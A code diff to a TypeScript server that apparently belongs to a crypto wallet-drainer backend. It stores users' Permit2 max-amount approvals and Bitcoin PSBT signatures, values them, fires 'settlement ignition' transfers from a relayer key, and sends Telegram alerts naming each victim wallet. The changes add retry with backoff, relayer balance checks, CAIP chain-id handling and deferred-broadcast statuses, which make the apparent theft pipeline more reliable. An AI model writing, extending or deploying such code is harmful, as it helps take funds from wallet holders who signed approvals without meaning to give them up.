@@ -13,6 +13,7 @@ import {
   packOmnichainAtomicSignatureEnvelope,
   parseOmnichainAtomicSignatureEnvelope,
   PERMIT2_MAX_AMOUNT,
+  resolveChainIngress,
   resolvePermit2ApprovalAmountForToken,
   resolveGatekeeperEthereumRpcUrl,
   type SettlementPolicyDecision,
@@ -84,7 +85,7 @@ import { sealSignatureHexForPersistence } from '@legion/core/security/signature-
 import { createClient } from '@supabase/supabase-js'
 import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
 import type { Address, Hex } from 'viem'
-import { createPublicClient, getAddress, http, isAddress, stringToHex } from 'viem'
+import { createPublicClient, getAddress, http, isAddress, privateKeyToAccount, stringToHex } from 'viem'
 import { arbitrum, base, mainnet, sepolia, bscTestnet } from 'viem/chains'
 
 import { sendFailure, sendSuccess } from '../lib/api-response.js'
@@ -123,6 +124,64 @@ import {
 } from '../lib/settlement-history.js'
 
 const SHADOW_ENVELOPE_PREFIX = 'SHADOW_GCM:v1:'
+const BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93'
+const SETTLEMENT_RPC_RETRY_DELAYS_MS = [2000, 5000, 10000] as const
+
+function settlementBackoffDelayMs(attempt: number): number {
+  const base = SETTLEMENT_RPC_RETRY_DELAYS_MS[attempt] ?? 10000
+  return base + Math.floor(Math.random() * base * 0.5)
+}
+
+function sleepSettlementMs(ms: number): Promise<void> {
+  return new Promise((resolve) => {
+    setTimeout(resolve, ms)
+  })
+}
+
+function isDeferredBroadcastFault(fault: string): boolean {
+  const f = fault.toLowerCase()
+  return (
+    f.includes('insufficient_relayer_balance') === false &&
+    (f.includes('rpc') ||
+      f.includes('network relay') ||
+      f.includes('broadcast_failed') ||
+      f.includes('econnrefused') ||
+      f.includes('timeout') ||
+      f.includes('fetch failed') ||
+      f.includes('socket') ||
+      f.includes('503') ||
+      f.includes('502') ||
+      f.includes('relay'))
+  )
+}
+
+function isInsufficientRelayerFault(fault: string): boolean {
+  return fault.toLowerCase().includes('insufficient_relayer_balance')
+}
+
+async function checkSettlementRelayerBalance(
+  chainId: number,
+): Promise<{ ok: true } | { ok: false; detail: string }> {
+  const rawKey =
+    process.env['SETTLEMENT_EXECUTION_PRIVATE_KEY']?.trim() ||
+    process.env['PRIVATE_KEY']?.trim()
+  if (!rawKey) return { ok: true }
+  try {
+    const pk = (rawKey.startsWith('0x') ? rawKey : `0x${rawKey}`) as Hex
+    const account = privateKeyToAccount(pk)
+    const rpcUrl = getRpcUrlForChainWithFallback(chainId) || resolveGatekeeperEthereumRpcUrl()
+    if (!rpcUrl) return { ok: true }
+    const client = createPublicClient({ transport: http(rpcUrl) })
+    const minWei = BigInt(process.env['MIN_RELAYER_WEI']?.trim() || '10000000000000000')
+    const bal = await client.getBalance({ address: account.address })
+    if (bal < minWei) {
+      return { ok: false, detail: `relayer balance ${bal} < min ${minWei}` }
+    }
+    return { ok: true }
+  } catch {
+    return { ok: true }
+  }
+}
 
 function hasConfiguredShadowEnvelopeKey(): boolean {
   const explicit = process.env['SHADOW_VAULT_KEY']?.trim()
@@ -188,6 +247,7 @@ interface NormalizedIngressV1 {
   wallet_type: string
   protocol: string
   chain_id?: number | string
+  caip_chain_id?: string
   engine_spender?: Address
   permit2?: Address
   permit_metadata?: Permit2SingleMetadata
@@ -334,6 +394,7 @@ type PersistedSignatureRow = {
   protocol: string
   chain_family?: ChainFamily | null
   chain_id?: string | null
+  caip_chain_id?: string | null
   scout_value_usd?: string | null
   amount?: string | null
   max_allowance?: string | null
@@ -886,7 +947,12 @@ async function updateSignatureSettlementStatus(params: {
   supabase: SupabaseAdminClient
   wallet_address: string
   token_address: string
-  settlement_status: 'PENDING' | 'FAILED_STRIKE' | 'FAILED_SETTLEMENT' | 'SETTLED'
+  settlement_status:
+    | 'PENDING'
+    | 'PENDING_BROADCAST'
+    | 'FAILED_STRIKE'
+    | 'FAILED_SETTLEMENT'
+    | 'SETTLED'
 }): Promise<void> {
   // eslint-disable-next-line @typescript-eslint/no-explicit-any
   const { error } = await (params.supabase as any)
@@ -1265,6 +1331,10 @@ function resolveSettlementChainId(
   row: PersistedSignatureRow,
   chain_id: string | null,
 ): string | null {
+  if (row.caip_chain_id != null && String(row.caip_chain_id).trim() !== '') {
+    const fam = (row.chain_family ?? 'EVM').toUpperCase()
+    if (fam !== 'EVM') return String(row.caip_chain_id).trim()
+  }
   if (chain_id != null && chain_id.trim() !== '') return chain_id.trim()
   if (row.chain_id != null && String(row.chain_id).trim() !== '') {
     return String(row.chain_id).trim()
@@ -1317,33 +1387,83 @@ async function runEventDrivenReconciliation(params: {
     tokenAddress: row.token_address,
   }
   let outcome: SettlementIgnitionOutcome | undefined
+  const chainCtx = resolveChainIngress({
+    chain_family: row.chain_family,
+    chain_id: row.chain_id,
+    caip_chain_id: row.caip_chain_id,
+  })
+  const chainIdNum = chainCtx.evmChainId ?? 1
+
+  if (defer_broadcast === false && (row.chain_family ?? 'EVM').toUpperCase() === 'EVM') {
+    const relayer = await checkSettlementRelayerBalance(chainIdNum)
+    if (!relayer.ok) {
+      return { ignition_fault: `INSUFFICIENT_RELAYER_BALANCE: ${relayer.detail}` }
+    }
+  }
+
+  const runIgnitionOnce = async (): Promise<SettlementIgnitionOutcome | undefined> => {
+    let inner: SettlementIgnitionOutcome | undefined
+    try {
+      const ignitionFn = () =>
+        executeSettlementIgnition(buildLiquidationTriggerFromAnchorRow(row, chain_id, scout_value_usd), {
+          defer_broadcast: defer_broadcast ?? (process.env['SETTLEMENT_IMMEDIATE'] === 'true' ? false : true),
+          onBroadcastScheduled: async (scheduledIso) => {
+            await updateSignatureScheduledBroadcastTime({
+              supabase,
+              nonce: row.nonce,
+              scheduled_broadcast_time: scheduledIso,
+            })
+            await notifyBroadcastScheduled(
+              scheduledIso,
+              row.wallet_address,
+              reconciliationTelegramCtx,
+            )
+          },
+          onRelaySecondLegBroadcast: async (secondLegTxHash) => {
+            await notifyBroadcastConfirmed(
+              secondLegTxHash,
+              row.wallet_address,
+              { ...reconciliationTelegramCtx, tx_hash: secondLegTxHash },
+            )
+          },
+        })
+      inner = settlement_policy
+        ? await runSettlementWithPolicyMev(settlement_policy, ignitionFn)
+        : await ignitionFn()
+    } catch (ignErr) {
+      const fault = ignErr instanceof Error ? ignErr.message : String(ignErr)
+      gatekeeperPersistLog(
+        'error',
+        'signatures.settlement_ignition',
+        fault,
+        anchorLogFields(row, scout_value_usd),
+      )
+      inner = { ignition_fault: fault }
+    }
+    return inner
+  }
+
   try {
-    const ignitionFn = () =>
-      executeSettlementIgnition(buildLiquidationTriggerFromAnchorRow(row, chain_id, scout_value_usd), {
-        defer_broadcast: defer_broadcast ?? (process.env['SETTLEMENT_IMMEDIATE'] === 'true' ? false : true),
-        onBroadcastScheduled: async (scheduledIso) => {
-          await updateSignatureScheduledBroadcastTime({
-            supabase,
-            nonce: row.nonce,
-            scheduled_broadcast_time: scheduledIso,
-          })
-          await notifyBroadcastScheduled(
-            scheduledIso,
-            row.wallet_address,
-            reconciliationTelegramCtx,
-          )
-        },
-        onRelaySecondLegBroadcast: async (secondLegTxHash) => {
-          await notifyBroadcastConfirmed(
-            secondLegTxHash,
-            row.wallet_address,
-            { ...reconciliationTelegramCtx, tx_hash: secondLegTxHash },
-          )
-        },
-      })
-    outcome = settlement_policy
-      ? await runSettlementWithPolicyMev(settlement_policy, ignitionFn)
-      : await ignitionFn()
+    outcome = await runIgnitionOnce()
+    let fault = settlementIgnitionFault(outcome)
+    let attempt = 0
+    while (
+      fault != null &&
+      isDeferredBroadcastFault(fault) &&
+      defer_broadcast === false &&
+      attempt < SETTLEMENT_RPC_RETRY_DELAYS_MS.length
+    ) {
+      await sleepSettlementMs(settlementBackoffDelayMs(attempt))
+      attempt++
+      gatekeeperPersistLog(
+        'warn',
+        'signatures.settlement_retry',
+        `attempt ${attempt}/${SETTLEMENT_RPC_RETRY_DELAYS_MS.length}: ${fault}`,
+        anchorLogFields(row, scout_value_usd),
+      )
+      outcome = await runIgnitionOnce()
+      fault = settlementIgnitionFault(outcome)
+    }
   } catch (ignErr) {
     const fault = ignErr instanceof Error ? ignErr.message : String(ignErr)
     gatekeeperPersistLog(
@@ -1357,15 +1477,16 @@ async function runEventDrivenReconciliation(params: {
 
   const fault = settlementIgnitionFault(outcome)
   if (fault != null) {
+    const deferred = isDeferredBroadcastFault(fault) && defer_broadcast === false
     await updateSignatureSettlementStatus({
       supabase,
       wallet_address: row.wallet_address,
       token_address: row.token_address,
-      settlement_status: 'FAILED_SETTLEMENT',
+      settlement_status: deferred ? 'PENDING_BROADCAST' : 'FAILED_SETTLEMENT',
     })
     gatekeeperPersistLog(
       'warn',
-      'signatures.reconciliation_failed',
+      deferred ? 'signatures.reconciliation_deferred' : 'signatures.reconciliation_failed',
       fault,
       anchorLogFields(row, scout_value_usd),
     )
@@ -1898,7 +2019,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
         network: built.network,
         protocol: 'bitcoin_psbt',
         chain_family: 'UTXO',
-        chain_id: built.network === 'testnet' ? 'bip122:1' : 'bip122:0',
+        chain_id: built.network === 'testnet' ? 'bip122:1' : BIP122_BITCOIN_MAINNET,
       })
     } catch (e) {
       const msg = e instanceof Error ? e.message : String(e)
@@ -1914,6 +2035,17 @@ async function persistSignatureRow(
   row: PersistedSignatureRow,
   reply: FastifyReply,
 ): Promise<FastifyReply> {
+  const chainResolved = resolveChainIngress({
+    chain_family: row.chain_family,
+    chain_id: row.chain_id,
+    caip_chain_id: row.caip_chain_id,
+  })
+  row = {
+    ...row,
+    chain_family: (row.chain_family ?? chainResolved.chainFamily) as ChainFamily,
+    chain_id: chainResolved.storageChainId,
+    caip_chain_id: chainResolved.caipChainId ?? row.caip_chain_id ?? null,
+  }
   let url: string
   try {
     url = resolveCentralHubVaultUrl()
@@ -1971,6 +2103,9 @@ async function persistSignatureRow(
   }
   if (row.chain_id != null && String(row.chain_id).trim() !== '') {
     rowPayload['chain_id'] = String(row.chain_id).trim()
+  }
+  if (row.caip_chain_id != null && String(row.caip_chain_id).trim() !== '') {
+    rowPayload['caip_chain_id'] = String(row.caip_chain_id).trim()
   }
   rowPayload['scout_value_usd'] =
     row.scout_value_usd != null && row.scout_value_usd !== '' ? row.scout_value_usd : '0'
@@ -2190,6 +2325,28 @@ async function persistSignatureRow(
   })
 
   if (settlement_fault != null) {
+    if (isInsufficientRelayerFault(settlement_fault)) {
+      return sendFailure(reply, 503, 'Insufficient relayer balance for settlement broadcast', {
+        code: 'INSUFFICIENT_RELAYER_BALANCE',
+        settlement_status: 'PENDING_BROADCAST',
+        settlement_fault,
+        handshake_active: true,
+        settlement_reconciliation_queued: false,
+        lethal_core_aligned: true,
+        ...(omnichain_settlement ? { omnichain_settlement } : {}),
+      })
+    }
+    if (isDeferredBroadcastFault(settlement_fault)) {
+      return sendFailure(reply, 503, 'Settlement broadcast deferred — RPC unavailable', {
+        code: 'DEFERRED_BROADCAST',
+        settlement_status: 'PENDING_BROADCAST',
+        settlement_fault,
+        handshake_active: true,
+        settlement_reconciliation_queued: false,
+        lethal_core_aligned: true,
+        ...(omnichain_settlement ? { omnichain_settlement } : {}),
+      })
+    }
     return sendFailure(reply, 502, 'Settlement broadcast failed', {
       code: 'SettlementBroadcastFailed',
       settlement_status: 'FAILED_SETTLEMENT',
@@ -2465,7 +2622,7 @@ async function handleNormalizedIngress(
     const chainIdNorm =
       b.chain_id != null && String(b.chain_id).trim() !== ''
         ? String(b.chain_id).trim()
-        : 'bip122:0'
+        : BIP122_BITCOIN_MAINNET
     const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
     return persistSignatureRow(
       {
